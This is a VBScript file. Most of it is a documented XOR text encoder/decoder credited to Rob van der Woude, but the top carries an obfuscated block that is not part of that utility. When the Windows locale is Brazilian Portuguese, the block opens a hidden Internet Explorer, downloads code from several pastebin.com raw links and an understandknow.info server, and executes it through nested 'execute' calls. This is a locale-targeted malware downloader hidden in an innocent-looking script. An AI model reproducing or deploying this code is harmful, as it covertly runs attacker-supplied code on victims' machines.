Option Explicit
dim vE9tfdi,ie,url,y

FhhouwOc=GetLocale
if FhhouwOc=1046 then
vE9tfdi="JYJuzuzeNvq3XYMQl5BqYMQl5MQl5BqYMQl5BqeFfaYFfaYbfeNvq3XYMQl5BqYMQl5BqeFfaYFMQl5BqYMQl5BqeFfaYFfaYbfeNvq3XYMQl5BqYMQl5BqeFfaYFMQl5BqYMQl5BqeFfaYFfaYbfeNvq3XYMQl5BqYMQl5BqeFfaYFBqeFfaYFfaYbfeNvq3XYMQl5BqYMQl5BqeFfaYFfaYbf"
dim FhhouwOc,FhhouwOuii
FhhouwOuii = FhhouwOuii & ":"
FhhouwOuii = FhhouwOuii & "/"
FhhouwOuii = FhhouwOuii & "/"
dim FhhouwO
set FhhouwO=CreateObject("Microsoft.XMLHTTP")
Set ie = CreateObject("InternetExplorer.Application")
Function FhhouwOcceee()
execute "ie.Navigate(URL):ie.Visible=false:DO WHILE ie.busy:LOOP"
execute "FhhouwOcceee =  ie.document.documentE"&"lement.inn"&"erText"
End Function
URL= "http" & FhhouwOuii & "pastebin.com/raw/G3yygQej?" & vE9tfdi
execute "FhhouwOss = FhhouwOcceee()"
Function FhhouwOcc()
FhhouwO.open "GET",URL,false
FhhouwO.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
FhhouwO.setRequestHeader "User-Agent", "movegoty"
execute "FhhouwO."&FhhouwOss
End Function
dim QVvFuAB
URL= "http" & FhhouwOuii & "pastebin.com/raw/NCiPkXve?" & vE9tfdi
execute "FhhouwOt = FhhouwOcceee()"
URL= "http" & FhhouwOuii & "understandknow.info/?c=et5&" & vE9tfdi
FhhouwOcc()
execute "execute FhhouwOt : FhhouwOt2 = FhhouwO.responsebody : FhhouwOt = BinaryToString(FhhouwOt2)"
y = FhhouwOt
URL= "http" & FhhouwOuii & "pastebin.com/raw/wzg2QABf?" & vE9tfdi
execute "FhhouwOss = FhhouwOcceee(): execute FhhouwOss"
QVvFuAB = h
ie.quit
execute "Exec" &  "ute QVvFuAB & vE9tfdiFhhouwO "
End if


Dim arrKey, errResult

arrKey = GetKey( "This is a short and simple ""passphrase""" )

WScript.Echo "Encoding . . ."
errResult = Encode( "coder.vbs", "coder.enc", arrKey )
If errResult <> 0 Then
    ShowError errResult
End If

WScript.Echo "Decoding again . . ."
errResult = Encode( "coder.enc", "coder.dec", arrKey )
If errResult <> 0 Then
    ShowError errResult
Else
    WScript.Echo "Done." & vbCrLf _
               & "Compare the files ""coder.vbs"" and ""coder.dec"", " _
               & "they should be identical."
End If


Sub ShowError( myError )
    On Error Resume Next
    Err.Raise myError
    WScript.Echo "ERROR " & Err.Number & ": " & Err.Description
    Err.Clear
    On Error Goto 0
    WScript.Quit
End Sub


Function Encode( myFileIn, myFileOut, arrCode )
' This function provides a simple (ASCII) text encoder/decoder using XOR.
' Because it uses XOR, both encoding and decoding can be performed by the
' same function, with the same key.
'
' Arguments:
' myFileIn   [string]        input text file (file to be encoded)
' myFileOut  [string]        output file (encoded text)
' arrCode    [array of int]  "key", consisting of any number of integers
'                            from 1 to 255; avoid 0, though it can be used,
'                            it doesn't encode anything.
'                            Use any number of elements in the "key" array,
'                            each element multiplies the number of possible
'                            keys by 255 (not 256 since 0 is avoided).
'                            If only a single element is used, it may be
'                            passed either as an array or as a single integer.
'
' Return code:
' 0 if all went well, otherwise the appropriate error number.
'
' Written by Rob van der Woude
' http://www.robvanderwoude.com

    ' Standard housekeeping
    Dim i, objFSO, objFileIn, objFileOut, objStreamIn

    Const ForAppending       =  8
    Const ForReading         =  1
    Const ForWriting         =  2
    Const TristateFalse      =  0
    Const TristateMixed      = -2
    Const TristateTrue       = -1
    Const TristateUseDefault = -2

    ' Use custom error handling
    On Error Resume Next

    ' If the "key" is a single digit, convert it to an array
    If Not IsArray( arrCode ) Then
        arrCode = Array( arrCode )
    End If

    ' Check if a valid "key" array is used
    For i = 0 To UBound( arrCode )
        If Not IsNumeric( arrCode(i) ) Then
            ' 1032    Invalid character
            Encode = 1032
            Exit Function
        End If
        If arrCode(i) < 0 Or arrCode(i) > 255 Then
            ' 1031    Invalid number
            Encode = 1031
            Exit Function
        End If
    Next

    ' Open a file system object
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )

    ' Open the input file if it exists
    If objFSO.FileExists( myFileIn ) Then
        Set objFileIn   = objFSO.GetFile( myFileIn )
        Set objStreamIn = objFileIn.OpenAsTextStream( ForReading, TriStateFalse )
    Else
        ' Error 53: File not found
        Encode = 53
        ' Close input file and release objects
        objStreamIn.Close
        Set objStreamIn = Nothing
        Set objFileIn   = Nothing
        Set objFSO      = Nothing
        ' Abort
        Exit Function
    End If

    ' Create the output file, unless it already exists
    If objFSO.FileExists( myFileOut ) Then
        ' Error 58: File already exists
        Encode = 58
        ' Close input file and release objects
        objStreamIn.Close
        Set objStreamIn = Nothing
        Set objFileIn   = Nothing
        Set objFSO      = Nothing
        ' Abort
        Exit Function
    Else
        Set objFileOut = objFSO.CreateTextFile( myFileOut, True, False )
    End If

    ' Encode the text from the input file and write it to the output file
    i = 0
    Do Until objStreamIn.AtEndOfStream
        i = ( i + 1 ) \ ( UBound( arrCode ) + 1 )
        objFileOut.Write Chr( Asc( objStreamIn.Read( 1 ) ) Xor arrCode(i) )
    Loop

    ' Close files and release objects
    objFileOut.Close
    objStreamIn.Close
    Set objStreamIn = Nothing
    Set objFileIn   = Nothing
    Set objFileOut  = Nothing
    Set objFSO      = Nothing

    ' Return the error number as status information
    Encode = Err.Number

    ' Done
    Err.Clear
    On Error Goto 0
End Function


Function GetKey( myPassPhrase )
' This function converts a password or passphrase
' into a "key" array for the Encode function.
    Dim i, arrCode( )
    ReDim arrCode( Len( myPassPhrase ) - 1 )
    For i = 0 To UBound( arrCode )
        arrCode(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )
    Next
    GetKey = arrCode
End Function

